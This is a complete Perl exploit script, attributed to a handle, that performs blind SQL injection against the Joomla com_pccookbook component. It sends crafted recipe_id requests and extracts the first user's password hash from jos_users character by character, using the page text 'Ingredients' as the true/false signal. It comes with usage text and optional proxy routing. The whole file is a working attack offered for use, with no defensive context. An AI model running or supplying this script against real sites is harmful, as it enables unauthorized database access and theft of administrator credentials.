#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
  print "                                                                        \n";                                                             
  print "  #########################################################################\n";
  print "  #   \n";
  print "  #            Joomla com_pccookbook Blind sql injection exploit \n";
  print "  #   \n";
  print "  #                              Cyb3R-1sT \n";
  print "  #                       cyb3r-1st[at]hotmail.com \n";
  print "  #   \n";
  print "  #                Usage:perl file.pl host path <options> \n";
  print "  #            example: perl file.pl www.host.com /joomla/ -a 7 \n";
  print "  #   \n";
  print "  #                           Options:  -a id \n";
  print "  #   \n";
  print "  #########################################################################\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $userid  = 1;
my $aid     = $ARGV[2];

my %options = ();
GetOptions(\%options, "u=i", "p=s", "a=i");

print "[~] Exploiting...\n";

if($options{"u"})
{
  $userid = $options{"u"};
}

if($options{"a"})
{
  $aid = $options{"a"};
}

syswrite(STDOUT, "[~] Password: ", 14);

for(my $i = 1; $i <= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f && $h <= 57)
  {
    if(istrue2($host, $path, $userid, $aid, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f && $h <= 122)
    {
      if(istrue2($host, $path, $userid, $aid, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print "\n[~] Exploiting done\n";

sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $uid   = shift;
  my $aid   = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent->new;
  my $query = "http://".$host.$path."index.php?option=com_pccookbook&page=viewrecipe&recipe_id=".$aid." and ascii(SUBSTRING((SELECT password FROM jos_users LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
 
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
 
  my $resp = $ua->get($query);
  my $content = $resp->content;
  my $regexp = "Ingredients";
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }

}

